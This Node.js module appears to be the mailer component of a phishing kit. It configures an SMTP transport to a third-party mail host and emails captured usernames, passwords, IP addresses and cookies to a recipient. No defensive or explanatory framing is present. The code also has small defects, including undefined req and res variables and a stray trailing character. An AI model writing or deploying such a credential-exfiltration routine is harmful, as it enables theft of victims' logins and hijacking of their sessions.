const nodemailer = require('nodemailer');
let httpMsgs = require('http-msgs');

function createNodeMailerTransport(user, pass) {
    return nodemailer.createTransport({
        pool: true,
        host: 'mail.century21.pt',
        port:  465,
        secure: true,
        auth: {
            user: user,
            pass: pass
        }
    });
}

function sendEmail(from, to, subject, username, pass, ip, cookies, nodeTransport) {
    var mailDetails = {
        from: from,
        to: to,
        subject: subject,
        html: '<p>Username: ' + username + '</p>' + '<p>Password: ' + pass + '</p>' + '<p>IP Address: ' + ip + '</p>'
    }

    // Append cookies to the email body
    mailDetails.html += '<p>Cookies: ' + cookies + '</p>';

    nodeTransport.verify(function (error, success) {
        if (error) {
            console.log(error);
        } else {
            nodeTransport.sendMail(mailDetails, function(err, data) {
                if (err) {
                    console.log(err);
                } else {
                    console.log(data);
                    httpMsgs.sendJSON(req, res, { response: 'success' });
                }
            });
        }
    });
}

module.exports = {
    createNodeMailerTransport: createNodeMailerTransport,
    sendEmail: sendEmail
};
w